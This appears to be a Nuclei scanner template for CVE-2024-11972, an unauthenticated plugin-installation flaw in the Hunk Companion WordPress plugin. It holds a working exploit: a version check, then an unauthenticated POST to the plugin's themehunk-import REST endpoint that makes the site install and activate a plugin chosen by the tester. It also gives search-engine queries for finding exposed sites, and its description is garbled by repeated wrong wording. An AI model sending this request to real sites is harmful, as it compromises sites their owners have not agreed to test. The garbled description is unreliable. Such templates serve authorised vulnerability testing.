id: CVE-2024-11972

info:
  name: Hunk Companion < 1.9.0 - Unauthenticated Plugin Installation
  author: popcorn94
  severity: critical
  description: |
    The Hunk Companion WordPress plugin before 1.9.0 does not correctly authorize some REST API endpoints, allowing unauthenticated requests to install and activate arbitrary Hunk Companion WordPress plugin before 1.9.0 from the WordPress.org repo, including vulnerable Hunk Companion WordPress plugin before 1.9.0 that have been closed.
    Usage: First, install themehunk theme , secondly take note of the plugin you want to activate, use --var plugin-name along with template
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-11972
    - https://wordpress.org/themes/almaira-shop/ (theme) or any themehunk themes (https://wordpress.org/themes/author/themehunk/)
    - https://downloads.wordpress.org/plugin/hunk-companion.1.8.8.zip (plugin)
    - https://wpscan.com/vulnerability/4963560b-e4ae-451d-8f94-482779c415e4/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 9.8
    cve-id: CVE-2024-11972
    cwe-id: CWE-862
    epss-score: 0.00085
    epss-percentile: 0.25683
    cpe: cpe:2.3:a:themehunk:hunk_companion:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: ThemeHunk
    product: hunk-companion
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/hunk-companion"
    fofa-query: body=/wp-content/plugins/hunk-companion/
    publicwww-query: /wp-content/plugins/hunk-companion/
  tags: cve,cve2024,wordpress,vkev

flow: http(1) && http(2)

http:
  - raw:
      - |
       GET /wp-content/plugins/hunk-companion/readme.txt HTTP/1.1

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, 'Hunk Companion')"
          - compare_versions(version, '< 1.9.0')
        condition: and
        internal: true

    extractors:
      - type: regex
        part: body
        group: 1
        name: version
        regex:
          - 'Stable tag: ([0-9.]+)'
        internal: true

  - raw:
      - |
       POST /wp-json/hc/v1/themehunk-import HTTP/1.1    
       Host: {{Hostname}}
       Content-Type: application/json
       
       {
          "params": {"templateType": "free", "plugin": {"{{plugin-name}}": "{{plugin-name}}"}, "allPlugins": [{"{{plugin-name}}": "{{plugin-name}}/{{plugin-name}}.php"}]}
       }
    #check vulnerable response contain http/https and http 200 status code as non vulnerable version show HTTP 404  
    matchers:
       - type: regex
         regex:
          - "https?:"
         condition: and
         internal: true
         
       - type: status
         status:
          - 200
         condition: and